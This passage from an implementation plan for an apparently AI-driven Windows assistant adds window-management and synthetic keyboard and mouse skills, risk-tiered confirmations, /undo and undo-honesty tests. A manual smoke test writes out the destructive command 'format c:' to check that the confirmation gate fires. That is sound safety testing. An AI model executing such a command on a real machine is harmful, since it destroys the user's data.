        "properties": {"title": {"type": "string", "description": "Part of the window title."}},
        "required": ["title"],
    }
    risk = Risk.DANGEROUS

    def consequence(self, title: str = "", **_) -> str:
        return f"Close the '{title}' window? Any unsaved work in it will be lost."

    def run(self, title: str) -> str:
        if not IS_WINDOWS:
            return "Window management is only available on Windows."
        matches, problem = _match(title)
        if problem:
            return problem

        hwnd, matched_title = matches[0]
        close_handle(hwnd)
        # Deliberately records no undo entry — a closed window cannot be reopened.
        return f"Closed {matched_title}."
```

- [ ] **Step 4: Register the skills**

In `skills/skill_manager.py`:

```python
from .window_skills import (
    CloseWindowSkill, FocusWindowSkill, ListWindowsSkill, SetWindowStateSkill,
)
```
```python
    ListWindowsSkill,
    FocusWindowSkill,
    SetWindowStateSkill,
    CloseWindowSkill,
```

- [ ] **Step 5: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add skills/window_skills.py skills/skill_manager.py tests/test_window_input_skills.py
git commit -m "feat: add window management skills"
```

---

## Task 9: Synthetic input

**Files:**
- Create: `skills/input_skills.py`
- Modify: `skills/skill_manager.py`, `requirements.txt`
- Test: `tests/test_window_input_skills.py`

**Interfaces:**
- Consumes: `BaseSkill`, `Risk`
- Produces: `TypeTextSkill` (`type_text`), `PressKeysSkill` (`press_keys`), `ClickSkill` (`click`); registration conditional on `config.ENABLE_INPUT_CONTROL`

- [ ] **Step 1: Write the failing test**

Append to `tests/test_window_input_skills.py`:

```python
import sys
from types import SimpleNamespace

from skills.input_skills import ClickSkill, PressKeysSkill, TypeTextSkill


@pytest.fixture
def gui(monkeypatch):
    calls = []
    fake = SimpleNamespace(
        FAILSAFE=True,
        write=lambda text, interval=0: calls.append(("write", text)),
        hotkey=lambda *keys: calls.append(("hotkey", keys)),
        click=lambda x=None, y=None, button="left", clicks=1: calls.append(
            ("click", x, y, button, clicks)
        ),
        press=lambda key: calls.append(("press", key)),
    )
    monkeypatch.setitem(sys.modules, "pyautogui", fake)
    return calls


def test_input_skills_are_moderate():
    assert TypeTextSkill().risk_for(text="hi") == Risk.MODERATE
    assert PressKeysSkill().risk_for(keys="ctrl+s") == Risk.MODERATE
    assert ClickSkill().risk_for(x=1, y=2) == Risk.MODERATE


def test_type_text(gui):
    out = TypeTextSkill().run(text="hello there")
    assert ("write", "hello there") in gui
    assert "hello there" in out


def test_press_keys_splits_a_combo(gui):
    PressKeysSkill().run(keys="ctrl+shift+s")
    assert ("hotkey", ("ctrl", "shift", "s")) in gui


def test_click_passes_coordinates(gui):
    ClickSkill().run(x=100, y=250, button="right", clicks=2)
    assert ("click", 100, 250, "right", 2) in gui


def test_input_skills_never_record_undo(gui, journal):
    """Typing and clicking cannot be reversed, so no undo may be offered."""
    TypeTextSkill().run(text="x")
    PressKeysSkill().run(keys="enter")
    ClickSkill().run(x=1, y=1)
    assert get_journal().latest() is None


def test_failsafe_stays_enabled(gui):
    """Slamming the mouse into a screen corner aborts an automation. That is a
    real safety feature and must not be disabled."""
    TypeTextSkill().run(text="x")
    assert sys.modules["pyautogui"].FAILSAFE is True


def test_missing_dependency_is_a_message(monkeypatch):
    monkeypatch.setitem(sys.modules, "pyautogui", None)
    out = TypeTextSkill().run(text="x")
    assert "pyautogui" in out
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_window_input_skills.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'skills.input_skills'`

- [ ] **Step 3: Write the implementation**

Create `skills/input_skills.py`:

```python
"""Synthetic keyboard and mouse input.

None of these can be undone — you cannot un-type a keystroke — so none of them
record an undo entry.

pyautogui's corner failsafe is left enabled deliberately: slamming the mouse
into a screen corner aborts an in-flight automation, which is the only runtime
escape hatch once Jarvis is driving the machine.
"""
from core.risk import Risk

from .base_skill import BaseSkill


def _gui():
    """Import pyautogui lazily and keep the failsafe on.

    Returns (module, error_message). Importing at module scope would fail on a
    headless box and take the whole skill registry down with it.
    """
    try:
        import pyautogui
    except ImportError:
        return None, "Input control needs the 'pyautogui' package. Run: pip install pyautogui"
    except Exception as e:
        return None, f"Input control is unavailable: {e}"

    if pyautogui is None:
        return None, "Input control needs the 'pyautogui' package. Run: pip install pyautogui"

    pyautogui.FAILSAFE = True
    return pyautogui, None


class TypeTextSkill(BaseSkill):
    name = "type_text"
    description = (
        "Type text on the user's keyboard, into whatever window has focus. Use "
        "for filling in apps that have no other way in. Cannot be undone."
    )
    input_schema = {
        "type": "object",
        "properties": {"text": {"type": "string", "description": "The text to type."}},
        "required": ["text"],
    }
    risk = Risk.MODERATE

    def consequence(self, text: str = "", **_) -> str:
        preview = text if len(text) <= 60 else text[:60] + "..."
        return f"Type this into the focused window?\n    {preview}"

    def run(self, text: str) -> str:
        gui, problem = _gui()
        if problem:
            return problem
        if not text:
            return "There was nothing to type."
        gui.write(text, interval=0.01)
        return f"Typed {len(text)} characters."


class PressKeysSkill(BaseSkill):
    name = "press_keys"
    description = (
        "Press a key or key combination, e.g. 'enter', 'ctrl+s', 'alt+tab'. "
        "Cannot be undone."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "keys": {
                "type": "string",
                "description": "A key or combination joined by '+', e.g. 'ctrl+shift+s'.",
            }
        },
        "required": ["keys"],
    }
    risk = Risk.MODERATE

    def consequence(self, keys: str = "", **_) -> str:
        return f"Press {keys}?"

    def run(self, keys: str) -> str:
        gui, problem = _gui()
        if problem:
            return problem

        parts = [p.strip().lower() for p in (keys or "").split("+") if p.strip()]
        if not parts:
            return "There were no keys to press."

        gui.hotkey(*parts)
        return f"Pressed {'+'.join(parts)}."


class ClickSkill(BaseSkill):
    name = "click"
    description = (
        "Click the mouse at a screen position. Pair with see_screen to find "
        "what to click. Cannot be undone."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "x": {"type": "integer", "description": "Screen X coordinate."},
            "y": {"type": "integer", "description": "Screen Y coordinate."},
            "button": {"type": "string", "enum": ["left", "right", "middle"]},
            "clicks": {"type": "integer", "description": "1 for a single click, 2 to double-click."},
        },
        "required": ["x", "y"],
    }
    risk = Risk.MODERATE

    def consequence(self, x: int = 0, y: int = 0, button: str = "left", **_) -> str:
        return f"{button.title()}-click at ({x}, {y})?"

    def run(self, x: int, y: int, button: str = "left", clicks: int = 1) -> str:
        gui, problem = _gui()
        if problem:
            return problem
        gui.click(x=int(x), y=int(y), button=button, clicks=max(1, int(clicks)))
        return f"Clicked at ({x}, {y})."
```

- [ ] **Step 4: Register conditionally and add the dependency**

In `skills/skill_manager.py`, next to the shell block:

```python
if config.ENABLE_INPUT_CONTROL:
    from .input_skills import ClickSkill, PressKeysSkill, TypeTextSkill

    SKILL_CLASSES.extend([TypeTextSkill, PressKeysSkill, ClickSkill])
```

In `requirements.txt`, under the screen-awareness block:

```
# Synthetic keyboard/mouse input (ENABLE_INPUT_CONTROL)
pyautogui>=0.9.54
```

- [ ] **Step 5: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add skills/input_skills.py skills/skill_manager.py requirements.txt tests/test_window_input_skills.py
git commit -m "feat: add synthetic keyboard and mouse input skills"
```

---

## Task 10: Terminal undo, notifications, and the honesty check

**Files:**
- Modify: `main.py`, `core/brain.py`, `README.md`
- Test: `tests/test_skills.py`

**Interfaces:**
- Consumes: everything above
- Produces: `/undo` command; `Session.announce(skill, tool_input, outcome)` wired as `Brain(on_action=...)`; `REVERSIBLE_SKILLS` in `tests/test_skills.py`

- [ ] **Step 1: Write the failing test**

Append to `tests/test_skills.py`:

```python
"""The undo-honesty check.

Every skill either can reverse itself and says so, or cannot and stays silent.
A skill that gains or loses undo support without its description being updated
is exactly the drift this test exists to catch.
"""
REVERSIBLE_SKILLS = {
    "write_file",
    "make_dir",
    "move_file",
    "delete_file",
    "focus_window",
    "set_window_state",
}

NEVER_REVERSIBLE = {
    "run_command",
    "type_text",
    "press_keys",
    "click",
    "close_window",
    "power_control",
    "close_app",
}


def test_reversible_and_irreversible_sets_are_disjoint():
    assert REVERSIBLE_SKILLS.isdisjoint(NEVER_REVERSIBLE)


def test_every_declared_skill_is_registered():
    registered = set(SkillManager().skills)
    for name in REVERSIBLE_SKILLS | NEVER_REVERSIBLE:
        assert name in registered, f"{name} is not registered"


def test_irreversible_skills_describe_themselves_honestly():
    """If a skill cannot be undone, its description must say so — the model
    relays that to the user before they agree to it."""
    manager = SkillManager()
    for name in ["run_command", "type_text", "press_keys", "click", "close_window"]:
        description = manager.get(name).description.lower()
        assert "undo" in description or "unsaved" in description, name
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_skills.py -q`
Expected: PASS if Tasks 5-9 registered everything; FAIL naming any skill that is missing or whose description omits the irreversibility note. Fix by registering it or amending the description — do not weaken the test.

- [ ] **Step 3: Wire the terminal notifier and /undo**

In `main.py`, add to the imports:

```python
from core.undo import get_journal, prune_trash
```

Add a method to `Session`:

```python
    def announce(self, skill, tool_input, outcome) -> None:
        """Report a completed MODERATE action. Only offers undo when the action
        genuinely recorded one, so the prompt never promises what it can't do."""
        if outcome.undo_token:
            entry = get_journal().latest()
            what = entry.description if entry else "that"
            print(f"  [done] {skill.name} — /undo to reverse: {what}")
        else:
            print(f"  [done] {skill.name} (cannot be undone)")
```

Wire it in `main()`:

```python
    brain = Brain(confirm=session.confirm, on_text=speaker.say, store=store,
                  on_action=session.announce)
```

Add the command to `handle_command`, before the unknown-command fallthrough:

```python
    if cmd == "/undo":
        entry = get_journal().latest()
        if entry is None:
            print("There's nothing to undo.")
            return
        try:
            print(get_journal().undo(entry.token))
        except Exception as e:
            print(f"I couldn't undo that: {e}")
        return
```

Add `/undo` to the `COMMANDS` string:

```python
  /undo         reverse the last undoable action
```

Call `prune_trash()` once in `main()` right after `config.ensure_dirs()`:

```python
    prune_trash()
```

- [ ] **Step 4: Add the system-prompt guidance**

In `core/brain.py`, add entries to `_TOOL_GUIDANCE`:

```python
    "search_files": (
        "- search_files to find things on disk. Prefer it over run_command\n"
        "  with 'dir /s' or 'find' — it is faster and safer."
    ),
    "run_command": (
        "- run_command only for things no other skill covers. It cannot be\n"
        "  undone, so prefer read_file, write_file, and search_files."
    ),
```

Append to `_CLOSING`:

```
Some actions ask the user for confirmation first, and some cannot be undone.
When a tool result says the user declined, acknowledge it in one sentence and
move on — do not retry it or look for another route to the same action.
```

- [ ] **Step 5: Update the README**

In `README.md`, replace the Safety section's process-matching paragraph with a description of the three tiers, and add the new environment variables to the configuration table:

```markdown
| `ENABLE_SHELL` | `1` | Master switch for `run_command` |
| `ENABLE_INPUT_CONTROL` | `1` | Master switch for typing/clicking |
| `CONFIRM_TIMEOUT_SECONDS` | `30` | Unanswered spoken confirmation counts as no |
| `UNDO_WINDOW_SECONDS` | `900` | How long an action stays undoable |
| `TRASH_MAX_ENTRIES` | `200` | Deleted-file backups kept, by count |
| `TRASH_MAX_AGE_DAYS` | `7` | Deleted-file backups kept, by age |
```

- [ ] **Step 6: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS

- [ ] **Step 7: Manual smoke test**

From a Windows shell:

```bat
python main.py
```

Then, in order:
1. `find any .txt files under my desktop` — runs silently (SAFE).
2. `create a file called jarvis-test.txt on my desktop with the text hello` — runs, prints `[done] write_file — /undo to reverse: Delete the new jarvis-test.txt`.
3. `/undo` — the file disappears.
4. `delete jarvis-test.txt` — prompts for confirmation; answer `n`; nothing happens.
5. `run the command format c:` — prompts for confirmation; answer `n`.
6. `what windows do I have open` — lists them, no prompt.

- [ ] **Step 8: Commit**

```bash
git add main.py core/brain.py README.md tests/test_skills.py
git commit -m "feat: add /undo, action notifications, and undo-honesty tests"
```

---

## Self-Review

**Spec coverage:**

| Spec section | Task |
|---|---|
| `Risk` enum, three tiers | 1 |
| `classify_command`, denylist-before-split | 1 |
| Read-only allowlist, git special case, chain floor | 1 |
| Path sensitivity | 1 (engine), 6 (applied) |
| `UndoJournal`, tokens, expiry, retry-on-failure | 2 |
| Trash + pruning | 2 |
| `BaseSkill.risk`/`risk_for`/`consequence` | 3 |
| `SkillOutcome` | 3 |
| Migrate PowerControl / CloseApp | 3 |
| Brain tiered gate, `on_action` | 4 |
| file skills (7) | 5, 6 |
| `run_command` | 7 |
| window skills | 8 |
| input skills | 9 |
| Config keys + kill switches | 2 (keys), 7 & 9 (switches) |
| `/undo` + notifications | 10 |
| System-prompt guidance | 10 |
| Testing items 1-6 | 1, 6, 4, 10, 6, 7 |

No gaps.

**Placeholder scan:** No TBD/TODO. Every code step carries runnable code. Task 10 Step 2 deliberately expects a possible pass — the instruction says what to do in either outcome.

**Type consistency:** `SkillOutcome(content, is_error, undo_token)` is defined in Task 3 and consumed with those exact names in Tasks 4, 7, 9, 10. `Risk` members are `SAFE`/`MODERATE`/`DANGEROUS` throughout. `get_journal()`/`set_journal()`/`move_to_trash()`/`prune_trash()` defined Task 2, used with matching signatures in 5-10. Window helpers `enumerate_windows`/`foreground_handle`/`focus_handle`/`window_state`/`set_state`/`close_handle` are defined in Task 8 and patched by exactly those names in its tests. `consequence()` replaces `confirmation_prompt()` in Task 3 and every later call site uses `consequence`.
